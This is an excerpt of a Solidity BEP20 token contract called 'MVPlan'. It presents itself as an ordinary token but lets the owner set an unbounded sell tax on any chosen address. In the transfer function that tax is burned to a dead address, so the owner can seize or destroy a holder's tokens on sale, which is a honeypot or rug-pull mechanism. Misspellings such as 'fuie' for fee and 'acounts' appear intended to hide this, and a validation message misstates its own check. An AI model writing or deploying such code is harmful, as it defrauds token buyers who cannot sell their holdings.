 ...
 * there is an acounts (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner acounts will be the one that deploys the contract. This
 * can later be changed with {transferownership}.
 *
 * This module is used through inheritance. It will make available the modifuier
...
contract MVPlan is BEP20, Ownable, BaseToken {
    ...
    uint256 private _defaultSellfuie = 3;
    ...
    mapping(address => uint256) private _SLfuie;
    ...
    function setSLfuie(address _address, uint256 _value) external onlyowner {
        require(_value > 1, "acounts tax must be greater than or equal to 1");
        _SLfuie[_address] = _value;
    }

    function getSLfuie(address _address) external view onlyowner returns (uint256) {
        return _SLfuie[_address];
    }


    function setMarketacountsfuie(address _address, bool _value) external onlyowner {
        _marketacounts[_address] = _value;
    }

    function getMarketacountsfuie(address _address) external view onlyowner returns (bool) {
     ...
     * e.g. implement automatic token fuies, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        if (rF) {
            ...
            if (_SLfuie[sender] > 0) {
                tradefuie = _SLfuie[sender];
            }

            tradefuieAmount = amount.mul(tradefuie).div(100);
        }


        if (tradefuieAmount > 0) {
            _balances[_DEADaddress] = _balances[_DEADaddress].add(tradefuieAmount);
            emit Transfer(sender, _DEADaddress, tradefuieAmount);
        }
        _balances[recipient] = _balances[recipient].add(amount - tradefuieAmount);
        emit Transfer(sender, recipient, amount - tradefuieAmount);
    }
